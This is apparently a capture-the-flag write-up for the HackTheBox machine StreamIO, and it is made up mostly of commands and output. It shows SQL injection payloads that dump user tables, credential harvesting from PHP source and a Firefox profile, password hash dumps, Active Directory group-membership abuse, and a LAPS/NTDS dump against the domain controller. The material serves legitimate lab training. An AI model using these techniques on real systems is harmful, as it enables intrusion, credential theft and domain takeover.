---
title: HackTheBox-StreamIO
date: 2024-12-23 09:42:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [MSSQL, Add-Domain-Group-Member, firefox, LAPS]     # TAG names should always be lowercase
image : /assets/images/images (1).jpg
---

## WebServerSQLi

    abdef' union select 1,name,3,4,5,6 FROM master..sysdatabases;-- -

    abdef' union select 1,name,3,4,5,6 FROM master..sysdatabases;-- -

    abdef' union select 1, STRING_AGG(CONCAT(table_name, ',',column_name), ', '),3,4,5,6 FROM information_schema.columns;-- -

    movies,id, movies,imdb, movies,metascore, movies,movie, movies,votes, movies,year, users,id, users,is_staff, users,password, users,username

    abdef' union select 1, STRING_AGG(CONCAT(username, ' ',password), '\n'),3,4,5,6 FROM users;-- -

found creds

yoshihide : 66boysandgirls..

## found injectable 

    ➜  stream ffuf -u "https://streamio.htb/admin/?FUZZ=" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=m9uqrk5vlt9nqibfslm9srekcr" -fs 1678


    https://streamio.htb/admin/?debug=

## grab mssql creds

    PS C:\inetpub\streamio.htb> dir -recurse *.php | select-string -pattern "database"

    admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
    login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
    register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');

## Manual-Mssql-Enum

    PS C:\inetpub\streamio.htb> sqlcmd -H localhost -U db_admin -P 'B1@hx31234567890' -Q 'select name from master.dbo.sysdatabases'
    name                                                                                                                            
    --------------------------------------------------------------------------------------------------------------------------------
    master                                                                                                                          
    tempdb                                                                                                                          
    model                                                                                                                           
    msdb                                                                                                                            
    STREAMIO                                                                                                                        
    streamio_backup  

    PS C:\inetpub\streamio.htb> sqlcmd -H localhost -U db_admin -P 'B1@hx31234567890' -Q 'select table_name from streamio_backup.information_schema.tables'
    table_name                                                                                                                      
    --------------------------------------------------------------------------------------------------------------------------------
    movies                                                                                                                          
    users

    PS C:\inetpub\streamio.htb> sqlcmd -H localhost -U db_admin -P 'B1@hx31234567890' -Q 'USE streamio_backup; select * from users'
    Changed database context to 'streamio_backup'.
    id          username                                           password                                          
    ----------- -------------------------------------------------- --------------------------------------------------
            1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
            2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
            3 James                                              c660060492d9edcaa8332d89c99c9239                  
            4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
            5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
            6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
            7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
            8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

    (8 rows affected)
    PS C:\inetpub\streamio.htb> 

creds:

nikk37 : get_dem_girls2@yahoo.com

## firefox-pass-dec

https://github.com/lclevy/firepwd

    

    decrypting login/password pairs
    https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
    https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
    https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
    https://slack.streamio.htb:b'JDgodd',b'password@12'

## password-spray

JDgodd:JDg0dd1s@d0p3cr3@t0r

## Add-Domain-Group-Member

    $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

    $cred = New-Object System.Management.Automation.PSCredential('streamio\JDgodd', $pass)

    Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"

    Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "streamio\JDgodd"

## LAPS

    ➜  stream nxc smb streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
    [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
    SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
    SMB         10.10.11.158    445    DC               [-] DC\administrator:iJ4hbv!WEZ0a&m STATUS_LOGON_FAILURE


Video walkthrough
[WATCH!](https://youtu.be/cb7Q8rNTBCI)
